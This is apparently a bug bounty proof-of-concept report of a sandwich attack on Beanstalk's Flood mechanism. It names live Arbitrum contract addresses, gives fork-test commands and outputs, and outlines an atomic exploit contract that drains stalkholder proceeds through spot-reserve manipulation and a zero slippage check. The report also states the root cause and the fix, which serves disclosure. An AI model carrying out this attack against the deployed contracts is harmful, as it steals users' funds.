# PoC: SOP/Flood Sandwich Attack

## Setup

Fork test against live Basin Wells on Arbitrum. All swaps execute against the real deployed Well contracts with real on chain liquidity.

**Bean/WETH Well** (0xBeA00Aa8130aCaD047E137ec68693C005f8736Ce): pinned to block 440420446. ETH price at fork: ~$2,036 (Chainlink Arbitrum feed).

**Bean/wstETH Well** (0xBEa00BbE8b5da39a3F57824a1a13Ec2a8848D74F): latest block. TVL ~$6.8M. This is the largest soppable Well in Beanstalk.

**Beanstalk Diamond**: 0xD1A0060ba708BC4BCD3DA6C37EFa8deDF015FB70

```
git clone <gist_url>
cd flood-sandwich-poc
forge test --fork-url https://arb1.arbitrum.io/rpc -vvv
```

All 7 tests pass. No mocks, no simulated math. Every swap hits a real deployed contract.

---

## Test 1: sunrise() is permissionless

I called `sunrise()` from a random address to check for access control:

```
sunrise() revert reason: Season: Still current Season.
```

It reverts because the current season has not advanced yet. Not because the caller is unauthorized. The error message says "Season: Still current Season." not "Unauthorized" or "Only owner." When the season timer expires, any address can call `sunrise()`. There is no access restriction at SeasonFacet.sol:39.

This matters because the attacker needs to call `sunrise()` from inside their exploit contract. If sunrise had access control, the attack would not work. It does not.

---

## Test 2: spot reserves are manipulable

I swapped 1 WETH ($2,036) into the Bean/WETH Well and checked reserves before and after:

```
bean reserve before: 38330626648
bean reserve after:  31222866607
bean drop:           18%
from a single 1 WETH swap ($2036)
```

A single $2,036 trade moved the Bean reserve by 18% in the same block. `getWellsByDeltaB()` at LibFlood.sol:270 reads these spot reserves via `LibDeltaB.currentDeltaB()` to decide how many sopBeans to mint. An attacker who swaps before `sunrise()` in the same transaction directly controls the reserve values that Beanstalk reads.

Every other critical path in Beanstalk (minting, Convert, BDV calculation) uses TWA reserves from the MultiFlowPump for exactly this reason. The Flood path is the only exception.

---

## Test 3: sandwich extraction on Bean/WETH Well

I set up a 5% SOP (1,916,531,332 sopBeans, roughly 5% of the Bean reserve). First I ran it without any manipulation to get the fair output. Then I ran it with a 15% Bean reserve front run: the attacker sells 15% of the Bean reserve into the Well before the SOP swap, then buys Bean back after.

```
--- pool state ---
bean reserve:  38330626648 (~38330 Bean)
weth reserve:  4392785691909938189 (~4.39 WETH)
pool value:    ~$17,887
sopBeans:      1916531332

--- fair SOP ---
WETH to stalkholders: 209180271072758757 (~$425)

--- attacked SOP ---
WETH to stalkholders: 159158901847673638 (~$324)

--- damage ---
stalkholder WETH loss: 50021369225085119 (~$101)
extraction rate:       23%
attacker Bean profit:  475530331
```

Stalkholders received $324 instead of $425. The attacker extracted $101 and pocketed 475 extra Bean. The SOP swap completed successfully because `minAmountOut = 0` at LibFlood.sol:362 accepts any exchange rate.

---

## Test 4: 80% manipulation still does not revert

I ran the same test but with an 80% Bean dump before the SOP:

```
WETH drained from pool: 44%
fair SOP output:  209180271072758757 (~$425)
bad SOP output:    65957743108011792 (~$134)
stalkholder loss: 68%
swap reverted:    NO (minAmountOut=0 accepts anything)
```

68% of the SOP proceeds were stolen. The swap still completed. With `minAmountOut = 0`, there is literally no amount of manipulation that causes the swap to revert. If there were a reasonable slippage check (5% tolerance, TWA based floor, anything), these extreme manipulations would cause a revert and protect stalkholders.

---

## Test 5: atomic contract exploit

I deployed an `AtomicFloodExploit` contract on the fork. It has three functions: `frontRun()`, `triggerSunrise()`, and `backRun()`. In production, all three would execute in a single `attack()` function within one transaction. The test splits them to simulate the SOP step between front run and back run (since the actual `sunrise()` reverts for timing reasons in the fork, not access control reasons).

```
exploit contract:  0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
fair SOP:          209180271072758757 WETH (~$425)
attacked SOP:      159158901847673638 WETH (~$324)
extraction:        23%
attacker profit:   475530331 Bean
mempool needed:    NO (contract calls sunrise directly)
```

This proves the attack does not require monitoring the public mempool. The attacker deploys a contract and calls it when Flood conditions are met. The contract calls `sunrise()` directly. Everything is atomic.

On Arbitrum there is no public mempool anyway. The sequencer processes transactions. The program's exclusion of "impacts that require users to send transactions through the public mempool" does not apply here.

---

## Test 6: Bean/wstETH Well, 1% SOP ($8,137 stolen)

The Bean/wstETH Well has ~$6.8M TVL, making it the largest soppable Well. I ran the same sandwich attack with a 1% SOP (conservative estimate):

```
=== Bean/wstETH Well (the big pool) ===
bean reserve:    15182137291849 (15,182,137 Bean)
wstETH reserve:  1417641913944530903438 (1,417.64 wstETH)
pool value:      ~$6,767,822
sopBeans (1%):   151821372918 (151,821 Bean)

--- fair SOP ---
wstETH to stalkholders: 14036058553937356950 (~$33,504)

--- attacked SOP ---
wstETH to stalkholders: 10627000854122749698 (~$25,366)

--- damage ---
stalkholder wstETH loss: 3409057699814607252 (~$8,137)
extraction rate:         24%
attacker Bean profit:    37152662255 (37,152 Bean)
```

$8,137 stolen in a single Flood season from one Well. The attacker walks away with 37,152 extra Bean.

---

## Test 7: Bean/wstETH Well, 5% SOP ($38,533 stolen)

With a larger SOP (5%, still within normal Flood parameters):

```
=== 5% SOP on Bean/wstETH ===
sopBeans: 759106864592 (759,106 Bean)
fair wstETH out:   67506757806917380552 (~$161,138)
attacked out:      51363837461728422796 (~$122,605)
stolen:            $38,533
extraction:        23%
attacker profit:   188349823546 Bean (188,349)
```

$38,533 stolen. The attacker profits 188,349 Bean. This is from one Well in one Flood season. Across all 6 soppable Wells, the total extraction is higher. Flood can occur every season as long as conditions persist.

---

## Summary

| Test | Pool | SOP Size | Extraction | $ Stolen | Attacker Profit |
|------|------|----------|------------|----------|-----------------|
| 3 | Bean/WETH | 5% | 23% | $101 | 475 Bean |
| 4 | Bean/WETH | 5% (80% dump) | 68% | $291 | - |
| 5 | Bean/WETH | 5% (contract) | 23% | $101 | 475 Bean |
| 6 | Bean/wstETH | 1% | 24% | $8,137 | 37,152 Bean |
| 7 | Bean/wstETH | 5% | 23% | $38,533 | 188,349 Bean |

Root cause: `minAmountOut = 0` in `sopWell()` (LibFlood.sol:362) and spot reserve usage in `getWellsByDeltaB()` (LibFlood.sol:270). Fix both to eliminate the vulnerability.

---

## Source Code

Two test files, both in the gist:

### FloodSandwich.t.sol (Tests 1-5)

Tests against the Bean/WETH Well pinned to block 440420446. Includes the `AtomicFloodExploit` contract.

### BeanWstEthSandwich.t.sol (Tests 6-7)

Tests against the Bean/wstETH Well at latest block. Shows the dollar impact on the largest pool.

### foundry.toml

```toml
[profile.default]
src = "src"
out = "out"
libs = ["lib"]
evm_version = "cancun"
solc_version = "0.8.24"

[rpc_endpoints]
arbitrum = "https://arb1.arbitrum.io/rpc"
```

Run all tests:
```
forge test --fork-url https://arb1.arbitrum.io/rpc -vvv
```
